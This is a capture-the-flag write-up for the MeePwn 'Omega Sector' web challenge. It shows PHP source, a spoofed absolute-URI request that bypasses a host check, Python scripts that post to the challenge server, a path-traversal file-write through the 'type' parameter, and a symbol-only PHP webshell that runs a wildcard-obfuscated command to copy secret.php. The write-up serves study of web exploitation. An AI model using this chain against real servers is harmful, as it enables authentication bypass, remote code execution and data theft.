# Omega Sector (web, 44 solved, 140p)

This was a 2 stage web challenge.
Frist part was to get authenticated into the system.

## Authenticate

For starters we get [php source code](index.php) by finding hint in the html about `is_debug=1` parameter.
The important part is:

```php
$remote=$_SERVER['REQUEST_URI'];

if(strpos(urldecode($remote),'..'))
{
mapl_die();
}

if(!parse_url($remote, PHP_URL_HOST))
{
    $remote='http://'.$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];
}
$whoareyou=parse_url($remote, PHP_URL_HOST);


if($whoareyou==="alien.somewhere.meepwn.team"){
```

After we pass this check we can authenticate.
The tricky part is that normally `REQUEST_URI` contains only the file path, not the hostname.
And if there is no hostname there, then we get into the condition and overwrite the `$remote` with our own IP.
But if we go to https://secure.php.net/manual/pl/reserved.variables.server.php and read a bit we can find:

```
Note that $_SERVER['REQUEST_URI'] might include the scheme and domain in certain cases.
```

Basically we can send request:

```
GET http://human.ludibrium.meepwn.team?human=Yes 
HTTP/1.0
Host: human.ludibrium.meepwn.team
Connection: close


```

And it will pass the check just fine.
We can do the same for `alien` and therefore get session cookies authenticated to access `omega_sector.php` and `alien_sector.php`.

We can automate this with:

```python
    from crypto_commons.netcat.netcat_commons import nc
    s = nc("138.68.228.12", 80)
    s.sendall("GET http://human.ludibrium.meepwn.team?human=Yes HTTP/1.0\r\nHost: human.ludibrium.meepwn.team\r\nConnection: close\r\n\r\n")
    print(s.recv(9999))

    s = nc("138.68.228.12", 80)
    s.sendall("GET http://alien.somewhere.meepwn.team?alien=%40!%23%24%40!%40%40 HTTP/1.0\r\nHost: alien.somewhere.meepwn.team\r\nConnection: close\r\n\r\n")
    print(s.recv(9999))
```

## Exploit

Once we get authenticated we can explore new parts of the system.
Both look similar - there is a textbox where we can place some input and save it.

Once we do this, we get the filepath to the resulting file, for example: `Saved in human_message/239fe816a898ca6b036c5b21970af279.human`
And we can verify, the file is there.

If we look at the POST request, we can see that we control 2 parameters -> message and type.
Type is interesting because it is set to `human` here, and it seems there is no validation.
We can change it to `php` if we want.

In fact we can go even further, because we can set it to `'/../../alien_message/somefunnyname.php'`, and save file from `human` part in `alien` part if we want to.
More importantly, we can control the filename this way.


We can automate sending payloads by:

``python
def send_alien(content, path):
    r = requests.post('http://138.68.228.12/alien_sector.php', data={'message': content, 'type': path},
                      headers={'Cookie': 'PHPSESSID=a3bdqr9r40csph3el906dphtc0'})
    print(r.text)
```


Now the last part is to actually gain RCE and execute some code, because we need to gain access to `secret.php` file.
The difficulty is that the charsets are restricted.
We run a simple charset checker script and it showed us that basically human can use only letters, digits and whitespaces, and alien can use symbols and punctation.
We can't combine them, because the files are always overwritten, so we need to create the payload from only one of those.
It's clear we won't get PHP code without `<?` so the only choice is the alien part.

We can send:

    <?= `something here` ?>

To execute some code in the system shell.
We decided to run: `/???/??? ../??????.??? > ===`.

For those unfamiliar with bash path wildcards, `/???/???` matches `/bin/cat`, `../??????.???` matched `secret.php` and `===` is actually a proper filename.
So we're actually running `/bin/cat ../secret.php > ===`, efectively copying the secret file contents.
This is of course a bit random, because matching is alphabetical and some other 3-letter binary will also match, but we don't care.

After that we can simply read contents of `alien_message/===` to get the flag: `MeePwnCTF{__133-221-333-123-111___}`
